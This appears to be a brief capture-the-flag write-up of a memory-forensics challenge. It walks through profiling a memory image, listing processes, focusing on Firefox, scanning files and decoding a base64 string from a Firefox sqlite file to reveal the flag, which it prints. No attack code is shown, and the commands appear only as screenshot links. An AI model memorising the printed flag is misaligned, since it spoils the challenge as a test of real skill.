- Firstly we need to know information regarding the operating system. The below command will show some of profiles.
![Picture2](https://hackmd.io/_uploads/r1EIG0PQA.png)
- Once we find the profile we need to scan for all the process that have run in the system. The below is the command.
![Screenshot_2024-05-20_00-04-58](https://hackmd.io/_uploads/rysj-AvXR.png)
- In the challenge it is mentioned that the hacker likes the fox .So we need to focus more on the process that running firefox.
![Screenshot_2024-05-20_00-32-05](https://hackmd.io/_uploads/r1Da-0w7R.png)
- Now we can perform other scans like netscan,filescan,cmdscan etc… . I have found the filescan interesting. There i have found a bunch of files related to firefox.
![Screenshot_2024-05-20_00-35-07](https://hackmd.io/_uploads/Bk6kGCv7C.png)
- Like the above we will get many files. In one of the sqlite files the flag is encoded as base64. We need to extract the files one by one to our pc and we need to go through each file.
- In one of the sqlite files I have found suspicious base64 encoded text which decoded gives us the flag. 
![w](https://hackmd.io/_uploads/rJ2uGAP7R.png)


Flag ```BSMumbai{th1s_1s_th3_3as13st_0n3}```
